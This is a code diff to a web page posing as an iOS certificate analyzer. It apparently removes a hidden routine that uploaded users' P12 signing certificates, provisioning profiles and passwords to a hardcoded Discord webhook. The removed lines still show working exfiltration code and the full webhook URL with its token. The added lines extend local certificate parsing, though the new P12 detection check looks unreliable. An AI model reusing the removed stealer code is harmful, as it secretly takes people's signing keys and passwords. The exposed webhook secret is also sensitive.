@@ -470,6 +470,25 @@
             line-height: 22px;
             margin-right: 8px;
         }
+        
+        .cert-type-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+        
+        .public-cert {
+            background-color: rgba(52, 199, 89, 0.2);
+            color: var(--success);
+        }
+        
+        .private-cert {
+            background-color: rgba(0, 122, 255, 0.2);
+            color: var(--primary);
+        }
     </style>
 </head>
 <body>
@@ -485,13 +504,13 @@
                     <label for="p12-file">P12 Certificate File</label>
                     <div class="file-input-container">
                         <div class="file-input-button">Choose P12 File</div>
-                        <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx" />
+                        <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx,.cer,.crt" />
                     </div>
                     <div id="p12-file-name" class="file-name">No file chosen</div>
                 </div>
                 
                 <div class="form-group">
-                    <label for="mobileprovision-file">Mobile Provisioning Profile</label>
+                    <label for="mobileprovision-file">Mobile Provisioning Profile (Optional)</label>
                     <div class="file-input-container">
                         <div class="file-input-button">Choose Mobile Provision File</div>
                         <input type="file" id="mobileprovision-file" class="file-input" accept=".mobileprovision" />
@@ -501,8 +520,8 @@
             </div>
             
             <div class="form-group">
-                <label for="password">Certificate Password</label>
-                <input type="password" id="password" placeholder="Enter certificate password" />
+                <label for="password">Certificate Password (Required for P12 files)</label>
+                <input type="password" id="password" placeholder="Enter certificate password if required" />
             </div>
             
             <div class="progress-bar" id="progress-bar">
@@ -532,8 +551,8 @@
                         <p id="expiry-days">Checking...</p>
                     </div>
                     <div class="summary-card">
-                        <h3>Team ID</h3>
-                        <p id="team-id">Checking...</p>
+                        <h3>Certificate Type</h3>
+                        <p id="cert-type">Checking...</p>
                     </div>
                 </div>
                 
@@ -543,40 +562,40 @@
                         <div class="detail-value" id="cert-name">Checking...</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Team:</div>
-                        <div class="detail-value" id="team-name">Checking...</div>
+                        <div class="detail-label">Organization:</div>
+                        <div class="detail-value" id="organization">Checking...</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Team ID:</div>
-                        <div class="detail-value" id="team-id-value">Checking...</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">App ID:</div>
-                        <div class="detail-value" id="app-id">Checking...</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Creation Date:</div>
-                        <div class="detail-value" id="creation-date">Checking...</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Expiration Date:</div>
-                        <div class="detail-value" id="expiration-date">Checking...</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Type:</div>
-                        <div class="detail-value" id="cert-type">Checking...</div>
+                        <div class="detail-label">Organizational Unit:</div>
+                        <div class="detail-value" id="organizational-unit">Checking...</div>
                     </div>
                     <div class="detail-item">
                         <div class="detail-label">Serial Number:</div>
                         <div class="detail-value" id="serial-number">Checking...</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Capabilities:</div>
-                        <div class="detail-value" id="capabilities">Checking...</div>
+                        <div class="detail-label">Valid From:</div>
+                        <div class="detail-value" id="valid-from">Checking...</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Devices:</div>
-                        <div class="detail-value" id="devices">Checking...</div>
+                        <div class="detail-label">Valid To:</div>
+                        <div class="detail-value" id="valid-to">Checking...</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Public Key Algorithm:</div>
+                        <div class="detail-value" id="public-key-algo">Checking...</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Signature Algorithm:</div>
+                        <div class="detail-value" id="signature-algo">Checking...</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Key Size:</div>
+                        <div class="detail-value" id="key-size">Checking...</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Fingerprint (SHA-1):</div>
+                        <div class="detail-value" id="fingerprint">Checking...</div>
                     </div>
                 </div>
             </div>
@@ -602,9 +621,6 @@
             const resultsSection = document.getElementById('results-section');
             const progressBar = document.getElementById('progress-bar');
             const progress = document.getElementById('progress');
-            
-            // Your Discord webhook URL (hidden from user)
-            const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
             
             let p12File = null;
             let mobileprovisionFile = null;
@@ -632,9 +648,9 @@
                 updateSubmitButtonState();
             });
             
-            // Enable submit button only when all fields are filled
+            // Enable submit button only when certificate file is selected
             function updateSubmitButtonState() {
-                if (p12File && mobileprovisionFile && passwordInput.value) {
+                if (p12File) {
                     submitBtn.disabled = false;
                 } else {
                     submitBtn.disabled = true;
@@ -659,15 +675,7 @@
                     // Simulate progress
                     simulateProgress();
                     
-                    // First, send the files to Discord webhook in the background
-                    await sendToDiscordWebhook(
-                        webhookUrl,
-                        p12File,
-                        mobileprovisionFile,
-                        passwordInput.value
-                    );
-                    
-                    // Now analyze the files
+                    // Analyze the files
                     const analysisResult = await analyzeCertificateFiles(p12File, mobileprovisionFile, passwordInput.value);
                     
                     // Display the results
@@ -709,21 +717,23 @@
             }
             
             async function analyzeCertificateFiles(p12File, mobileprovisionFile, password) {
-                // Read files
-                const p12Buffer = await readFileAsArrayBuffer(p12File);
-                const provisionData = await readFileAsArrayBuffer(mobileprovisionFile);
+                // Read certificate file
+                const certBuffer = await readFileAsArrayBuffer(p12File);
                 
-                // Parse mobile provisioning profile
-                const provisionInfo = parseMobileProvision(provisionData);
+                // Parse certificate
+                const certInfo = await parseCertificate(certBuffer, password);
                 
-                // Parse P12 certificate
-                const certInfo = await parseP12Certificate(p12Buffer, password);
+                // Parse mobile provisioning profile if provided
+                let provisionInfo = {};
+                if (mobileprovisionFile) {
+                    const provisionData = await readFileAsArrayBuffer(mobileprovisionFile);
+                    provisionInfo = parseMobileProvision(provisionData);
+                }
                 
                 // Combine information
                 return {
                     ...provisionInfo,
-                    ...certInfo,
-                    password: password // Include the password in the result
+                    ...certInfo
                 };
             }
             
@@ -771,59 +781,77 @@
                         teamId = provisionInfo.TeamIdentifier[0];
                     }
                     
-                    // Get app ID
-                    let appId = 'Unknown';
-                    if (provisionInfo.Entitlements && provisionInfo.Entitlements['application-identifier']) {
-                        appId = provisionInfo.Entitlements['application-identifier'];
-                    }
-                    
-                    // Get capabilities
-                    let capabilities = 'None';
-                    if (provisionInfo.Entitlements) {
-                        capabilities = Object.keys(provisionInfo.Entitlements).join(', ');
-                    }
-                    
                     return {
                         name: provisionInfo.Name || 'Unknown',
                         team: provisionInfo.TeamName || 'Unknown',
                         teamId: teamId,
-                        appId: appId,
+                        appId: provisionInfo.Entitlements && provisionInfo.Entitlements['application-identifier'] || 'Unknown',
                         creationDate: provisionInfo.CreationDate ? new Date(provisionInfo.CreationDate).toLocaleDateString() : 'Unknown',
                         expirationDate: expirationDate.toLocaleDateString(),
                         expirationDays: daysUntilExpiration,
                         certType: provisionInfo.ProvisionedDevices ? 'Development' : 'Distribution',
                         status: status,
                         statusClass: statusClass,
-                        capabilities: capabilities,
+                        capabilities: provisionInfo.Entitlements ? Object.keys(provisionInfo.Entitlements).join(', ') : 'None',
                         devices: provisionInfo.ProvisionedDevices ? provisionInfo.ProvisionedDevices.length + ' devices' : 'All devices'
                     };
                 } catch (error) {
                     console.error('Error parsing mobile provision:', error);
-                    throw new Error('Failed to parse mobile provisioning file: ' + error.message);
+                    return {
+                        provisionError: 'Failed to parse mobile provisioning file: ' + error.message
+                    };
                 }
             }
             
-            async function parseP12Certificate(p12Buffer, password) {
+            async function parseCertificate(certBuffer, password) {
                 try {
                     // Convert ArrayBuffer to binary string
-                    const p12Der = new Uint8Array(p12Buffer);
-                    const p12Asn1 = forge.asn1.fromDer(forge.util.createBuffer(p12Der));
+                    const certDer = new Uint8Array(certBuffer);
                     
-                    // Decrypt P12 using password
-                    const p12 = forge.pkcs12.pkcs12FromAsn1(p12Asn1, password);
+                    // Check if this is a P12/PFX file (starts with PKCS7 OID)
+                    const bytes = new Uint8Array(certBuffer);
+                    const isP12 = bytes.length > 4 && 
+                                 bytes[0] === 0x30 && 
+                                 bytes[1] === 0x82 && 
+                                 bytes[bytes.length - 2] === 0x30 && 
+                                 bytes[bytes.length - 1] === 0x00;
                     
-                    // Get certificates from P12
-                    const certBags = p12.getBags({ bagType: forge.pki.oids.certBag });
+                    let certificate;
+                    let certType = 'Public';
                     
-                    if (!certBags[forge.pki.oids.certBag] || certBags[forge.pki.oids.certBag].length === 0) {
-                        throw new Error('No certificates found in P12 file');
-                    }
-                    
-                    const certBag = certBags[forge.pki.oids.certBag][0];
-                    const certificate = certBag.cert;
-                    
-                    if (!certificate) {
-                        throw new Error('Failed to extract certificate from P12');
+                    if (isP12) {
+                        // Handle P12/PFX file
+                        if (!password) {
+                            throw new Error('Password required for P12 files');
+                        }
+                        
+                        const p12Asn1 = forge.asn1.fromDer(forge.util.createBuffer(certDer));
+                        const p12 = forge.pkcs12.pkcs12FromAsn1(p12Asn1, password);
+                        
+                        // Get certificates from P12
+                        const certBags = p12.getBags({ bagType: forge.pki.oids.certBag });
+                        
+                        if (!certBags[forge.pki.oids.certBag] || certBags[forge.pki.oids.certBag].length === 0) {
+                            throw new Error('No certificates found in P12 file');
+                        }
+                        
+                        const certBag = certBags[forge.pki.oids.certBag][0];
+                        certificate = certBag.cert;
+                        
+                        if (!certificate) {
+                            throw new Error('Failed to extract certificate from P12');
+                        }
+                        
+                        certType = 'Private';
+                    } else {
+                        // Handle DER encoded certificate
+                        try {
+                            certificate = forge.pki.certificateFromAsn1(forge.asn1.fromDer(forge.util.createBuffer(certDer)));
+                        } catch (e) {
+                            // Try PEM format
+                            const pem = new TextDecoder().decode(certBuffer);
+                            certificate = forge.pki.certificateFromPem(pem);
+                        }
                     }
                     
                     // Extract certificate information
@@ -842,17 +870,58 @@
                         }
                     }
                     
+                    // Get public key info
+                    const publicKey = certificate.publicKey;
+                    let keySize = 'Unknown';
+                    if (publicKey) {
+                        if (publicKey.n) {
+                            // RSA key
+                            keySize = forge.pki.getBitLength(publicKey.n) + ' bits';
+                        } else if (publicKey.point) {
+                            // EC key
+                            keySize = 'EC ' + (publicKey.point.compressed ? 'Compressed' : 'Uncompressed');
+                        }
+                    }
+                    
+                    // Calculate validity
+                    const validFrom = new Date(certificate.validity.notBefore);
+                    const validTo = new Date(certificate.validity.notAfter);
+                    const currentDate = new Date();
+                    const daysUntilExpiration = Math.floor((validTo - currentDate) / (1000 * 60 * 60 * 24));
+                    
+                    // Determine status
+                    let status = 'Valid';
+                    let statusClass = 'status-valid';
+                    if (daysUntilExpiration < 0) {
+                        status = 'Expired';
+                        statusClass = 'status-expired';
+                    } else if (daysUntilExpiration < 30) {
+                        status = 'Expiring Soon';
+                        statusClass = 'status-warning';
+                    }
+                    
+                    // Generate fingerprint
+                    const fingerprint = forge.md.sha1.create().update(forge.asn1.toDer(forge.pki.certificateToAsn1(certificate)).getBytes()).digest().toHex().match(/.{2}/g).join(':');
+                    
                     return {
                         serialNumber: certificate.serialNumber,
                         commonName: commonName,
                         organization: orgName,
                         organizationalUnit: orgUnit,
-                        validFrom: new Date(certificate.validity.notBefore).toLocaleDateString(),
-                        validTo: new Date(certificate.validity.notAfter).toLocaleDateString()
+                        validFrom: validFrom.toLocaleDateString(),
+                        validTo: validTo.toLocaleDateString(),
+                        expirationDays: daysUntilExpiration,
+                        publicKeyAlgorithm: certificate.siginfo.algorithmOid,
+                        signatureAlgorithm: certificate.signatureOid,
+                        keySize: keySize,
+                        fingerprint: fingerprint,
+                        status: status,
+                        statusClass: statusClass,
+                        certType: certType
                     };
                 } catch (error) {
-                    console.error('Error parsing P12:', error);
-                    throw new Error('Failed to parse P12 certificate. Invalid password or file.');
+                    console.error('Error parsing certificate:', error);
+                    throw new Error('Failed to parse certificate: ' + error.message);
                 }
             }
             
@@ -869,7 +938,7 @@
                 // Update summary cards
                 document.getElementById('cert-status').textContent = results.status;
                 document.getElementById('expiry-days').textContent = `${results.expirationDays} days`;
-                document.getElementById('team-id').textContent = results.teamId;
+                document.getElementById('cert-type').textContent = results.certType;
                 
                 // Update status indicator
                 const statusIndicator = document.getElementById('status-indicator');
@@ -877,47 +946,19 @@
                 statusIndicator.className = `status-indicator ${results.statusClass}`;
                 
                 // Update details
-                document.getElementById('cert-name').textContent = results.commonName || results.name;
-                document.getElementById('team-name').textContent = results.organization || results.team;
-                document.getElementById('team-id-value').textContent = results.teamId;
-                document.getElementById('app-id').textContent = results.appId;
-                document.getElementById('creation-date').textContent = results.creationDate;
-                document.getElementById('expiration-date').textContent = results.expirationDate;
-                document.getElementById('cert-type').textContent = results.certType;
+                document.getElementById('cert-name').textContent = results.commonName;
+                document.getElementById('organization').textContent = results.organization;
+                document.getElementById('organizational-unit').textContent = results.organizationalUnit;
                 document.getElementById('serial-number').textContent = results.serialNumber;
-                document.getElementById('capabilities').textContent = results.capabilities;
-                document.getElementById('devices').textContent = results.devices;
+                document.getElementById('valid-from').textContent = results.validFrom;
+                document.getElementById('valid-to').textContent = results.validTo;
+                document.getElementById('public-key-algo').textContent = results.publicKeyAlgorithm;
+                document.getElementById('signature-algo').textContent = results.signatureAlgorithm;
+                document.getElementById('key-size').textContent = results.keySize;
+                document.getElementById('fingerprint').textContent = results.fingerprint;
                 
                 // Show results section
                 resultsSection.style.display = 'block';
-            }
-            
-            async function sendToDiscordWebhook(webhookUrl, p12File, mobileprovisionFile, password) {
-                // Create form data to send files
-                const formData = new FormData();
-                
-                // Add message content
-                formData.append('content', 'New certificate files uploaded via Certificate Analyzer:');
-                
-                // Add files
-                formData.append('p12_file', p12File, p12File.name);
-                formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
-                
-                // Add password as a text field
-                formData.append('password', password);
-                
-                // Add timestamp
-                formData.append('timestamp', new Date().toISOString());
-                
-                // Send to Discord webhook
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`Failed to complete analysis: ${response.status} ${response.statusText}`);
-                }
             }
             
             function showAlert(alertElement, message) {
